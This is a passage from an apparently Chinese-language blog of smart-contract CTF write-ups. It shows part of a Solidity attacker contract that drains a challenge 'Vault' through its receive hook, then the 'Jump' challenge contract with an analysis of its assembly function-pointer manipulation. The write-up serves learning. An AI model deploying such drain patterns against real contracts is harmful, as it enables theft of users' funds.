    target = Vault(_tar);
&#125;

function pwn() external payable &#123;
    target.withdraw(address(target).balance);
    require(target.isSolved(),&quot;attack step2 failed&quot;);
&#125;

receive() external payable &#123; 
    require(address(target).balance == 0,&quot;attack step1 failed&quot;);
    target.solve(59);
    target.deposit&#123;value:100&#125;();
&#125;
</code></pre>
<p>}</p>
<p>题2<br>pragma solidity 0.4.26;</p>
<p>contract Jump {</p>
<pre><code>constructor() public payable &#123;
    require(msg.value == 10);
&#125;

function withdraw() private &#123;
    require(msg.value == 0, &quot;no money&quot;);
    address(msg.sender).transfer(address(this).balance);
&#125;

function haloWorld() internal&#123;
    withdraw();
&#125;

struct Func &#123;
    function () internal f;
&#125;

function breakIt() public payable &#123;
    require(msg.value != 0, &quot;send money!&quot;);
    Func memory func;
    func.f = haloWorld;
    assembly &#123;
        mstore(func, add(mload(func), callvalue))
    &#125;
    func.f();
&#125;

function isSolved() public view returns(bool) &#123;
    return address(this).balance == 0;
&#125;
</code></pre>
<p>}</p>
<p>整个合约能够调用的只有breakIt方法，那么主要分析一下这个方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">function breakIt() public payable &#123;<br>        require(msg.value != 0, &quot;send money!&quot;);<br>        Func memory func;<br>        func.f = haloWorld;<br>        assembly &#123;<br>            mstore(func, add(mload(func), callvalue))<br>        &#125;<br>        func.f();<br>    &#125;<br></code></pre></td></tr></table></figure>
<p>这个方法首先检查调用者是否发送了以太币，否则会抛出异常。接着，创建了一个<code>Func</code>结构体的实例<code> func</code>，并将其函数指针<code>f</code>设置为<code>haloWorld</code>函数。然后使用<code>assembly</code>汇编块，尝试将调用者发送的以太币添加到<code>func</code>中的函数指针<code>f</code>上。</p>
<p>又因为调用breakIt需要支付wei而调用withdraw函数又不需要支付wei，因此通过breakIt进行调用是矛盾的</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/03/12/ERC20/">← Next ERC20</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/12/26/SprintBoot/SpringAOP/">SpringAOP Prev →</a></div></div></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="INDEX">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lexlady</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hello-Ethernaut"><span class="toc-number">1.</span> <span class="toc-text">Hello Ethernaut</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Force"><span class="toc-number">2.</span> <span class="toc-text">Force</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vault"><span class="toc-number">3.</span> <span class="toc-text">Vault</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#King"><span class="toc-number">4.</span> <span class="toc-text">King</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re-entrancy"><span class="toc-number">5.</span> <span class="toc-text">Re-entrancy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Elevator"><span class="toc-number">6.</span> <span class="toc-text">Elevator</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privacy"><span class="toc-number">7.</span> <span class="toc-text">Privacy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gatekeeper-One"><span class="toc-number">8.</span> <span class="toc-text">Gatekeeper One</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gatekeeper-Tow"><span class="toc-number">9.</span> <span class="toc-text">Gatekeeper Tow</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NaughtCoin"><span class="toc-number">10.</span> <span class="toc-text">NaughtCoin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Preservation"><span class="toc-number">11.</span> <span class="toc-text">Preservation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Recovery"><span class="toc-number">12.</span> <span class="toc-text">Recovery</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MagicNumber"><span class="toc-number">13.</span> <span class="toc-text">MagicNumber</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Alice-Codex"><span class="toc-number">14.</span> <span class="toc-text">Alice Codex</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Denial"><span class="toc-number">15.</span> <span class="toc-text">Denial</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shop"><span class="toc-number">16.</span> <span class="toc-text">Shop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dex"><span class="toc-number">17.</span> <span class="toc-text">Dex</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dex-Two"><span class="toc-number">18.</span> <span class="toc-text">Dex Two</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Puzzle-Wallet"><span class="toc-number">19.</span> <span class="toc-text">Puzzle Wallet</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Motorbike"><span class="toc-number">20.</span> <span class="toc-text">Motorbike</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DoubleEntryPoint"><span class="toc-number">21.</span> <span class="toc-text">DoubleEntryPoint</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GoodSamaritan"><span class="toc-number">22.</span> <span class="toc-text">GoodSamaritan</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GatekeeperThree"><span class="toc-number">23.</span> <span class="toc-text">GatekeeperThree</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Switch"><span class="toc-number">24.</span> <span class="toc-text">Switch</span></a></li></ol></div></div></div><footer><nobr>published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>